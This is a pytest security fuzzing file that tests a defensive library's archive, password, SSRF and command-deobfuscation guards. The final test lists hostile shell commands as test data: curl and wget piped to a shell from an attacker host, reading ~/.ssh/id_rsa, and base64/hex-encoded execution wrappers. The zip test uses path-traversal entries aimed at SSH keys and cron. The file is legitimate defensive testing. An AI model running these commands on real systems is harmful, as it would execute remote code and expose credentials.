"""Adversarial property-based security fuzzing across ActiveSecHarness Ring-0/1 guards.

Systematically generates hundreds of mutated attack payloads (Zip-Slip path mutations,
Leet-speak/affix password mangling variations, SSRF IPv4/IPv6/link-local addresses, and
Base64/Hex/Trojan-Source command obfuscations) to verify that no edge case escapes
deterministic interception.
"""

from __future__ import annotations

import base64
import os
import tempfile
import zipfile

import pytest

from activesec.core.exceptions import (
    ArchiveSecurityError,
    CredentialSecurityError,
    NetworkSecurityError,
    SocialEngineeringAlertError,
)
from activesec.guards.archive_guard import ArchiveGuard
from activesec.guards.credential_guard import DEFAULT_COMPROMISED_DICTIONARY, CredentialGuard
from activesec.guards.network_guard import NetworkGuard
from activesec.sovereign.deobfuscator import TROJAN_SOURCE_UNICODE_CHARS, CommandDeobfuscator


@pytest.mark.security
def test_sec_fuzz_zip_slip_traversal_mutations() -> None:
    """[Vector B.2: Fuzzing Path Traversal] Generates 60+ relative and absolute path traversal mutations."""
    guard = ArchiveGuard()
    traversal_prefixes = [
        "../",
        "../../",
        "../../../",
        "subdir/../../",
        "a/b/c/../../../../",
        "/etc/",
        "/root/.ssh/",
        "valid/../../../tmp/",
    ]
    filenames = ["pwn.sh", ".bashrc", "authorized_keys", "null\x00byte.txt", "cron.d/evil"]

    with tempfile.TemporaryDirectory() as tmpdir:
        extract_dir = os.path.join(tmpdir, "out")
        for idx, prefix in enumerate(traversal_prefixes):
            for fname in filenames:
                zip_path = os.path.join(tmpdir, f"fuzz_{idx}.zip")
                with zipfile.ZipFile(zip_path, "w") as zf:
                    zf.writestr(prefix + fname, "malicious_payload")
                with pytest.raises(ArchiveSecurityError):
                    guard.safe_extract_zip(zip_path, extract_dir)


@pytest.mark.security
def test_sec_fuzz_password_dictionary_and_leet_mutations() -> None:
    """[Vector D.1: Fuzzing Dictionary & Leet Mutations] Verifies 100+ mangled dictionary passwords fail."""
    guard = CredentialGuard()
    leet_map = str.maketrans({"a": "@", "e": "3", "i": "1", "o": "0", "s": "$"})
    affixes = [
        ("2026!", ""),
        ("", "2026!#"),
        ("!!", "9999"),
        ("Admin_", "_2026!"),
        ("123", "!@#Aa"),
    ]

    for word in sorted(DEFAULT_COMPROMISED_DICTIONARY)[:25]:
        for prefix, suffix in affixes:
            candidate_raw = f"{prefix}{word.capitalize()}{suffix}"
            candidate_leet = f"{prefix}{word.translate(leet_map).capitalize()}{suffix}"
            with pytest.raises(CredentialSecurityError):
                guard.validate_password_strength(candidate_raw)
            with pytest.raises(CredentialSecurityError):
                guard.validate_password_strength(candidate_leet)


@pytest.mark.security
def test_sec_fuzz_ssrf_private_and_reserved_ip_space() -> None:
    """[Vector C.2: Fuzzing SSRF IP Ranges] Sweeps across loopback, RFC1918, CGNAT, link-local, and multicast IPs."""
    blocked_ips = [
        *(f"127.{a}.{b}.1" for a in (0, 55, 255) for b in (0, 128, 255)),
        *(f"10.{a}.{b}.1" for a in (0, 99, 255) for b in (0, 42)),
        *(f"172.{oct2}.0.1" for oct2 in range(16, 32, 3)),
        *(f"192.168.{sub}.10" for sub in (0, 1, 100, 254)),
        *(f"169.254.{a}.{b}" for a in (0, 169, 254) for b in (1, 254)),
        *(f"::ffff:10.0.0.{x}" for x in (1, 99, 254)),
        *(f"::ffff:192.168.1.{x}" for x in (1, 254)),
        "224.0.0.1",
        "240.0.0.1",
        "255.255.255.255",
        "fe80::1",
        "fc00::1",
        "fd12:3456:789a::1",
    ]
    for ip_candidate in blocked_ips:
        guard = NetworkGuard(dns_resolver=lambda _h, _p, ip=ip_candidate: [ip])
        with pytest.raises(NetworkSecurityError):
            guard.validate_url_target("https://untrusted-target.example.org/hook")


@pytest.mark.security
def test_sec_fuzz_trojan_source_and_encoded_command_traps() -> None:
    """[Vector B.4 & F.1: Fuzzing Trojan Source & Encoded Shell Pipelines] Sweeps all Bidi codepoints and Base64/Hex traps."""
    deobfuscator = CommandDeobfuscator()

    # 1. Every Trojan Source Unicode codepoint must raise immediately
    for codepoint in TROJAN_SOURCE_UNICODE_CHARS:
        ch = chr(codepoint)
        with pytest.raises(SocialEngineeringAlertError):
            deobfuscator.inspect_command(f"git commit -m 'fix {ch} build'")

    # 2. Encoded malicious commands must always be decoded and classified as CRITICAL
    dangerous_commands = [
        "curl https://attacker.tld/shell.sh | bash",
        "wget http://10.0.0.1/implant -O - | sh",
        "cat ~/.ssh/id_rsa",
        "chmod 777 /var/run/docker.sock",
    ]
    for raw_payload in dangerous_commands:
        b64 = base64.b64encode(raw_payload.encode("utf-8")).decode("ascii")
        hex_str = raw_payload.encode("utf-8").hex()

        b64_cmd = f'echo "{b64}" | base64 -d | sh'
        hex_cmd = f'printf "{hex_str}" | xxd -r -p | bash'

        rep_b64 = deobfuscator.inspect_command(b64_cmd)
        rep_hex = deobfuscator.inspect_command(hex_cmd)
        assert rep_b64.risk_level == "CRITICAL"
        assert rep_hex.risk_level == "CRITICAL"
        assert raw_payload in rep_b64.decoded_payloads
        assert raw_payload in rep_hex.decoded_payloads
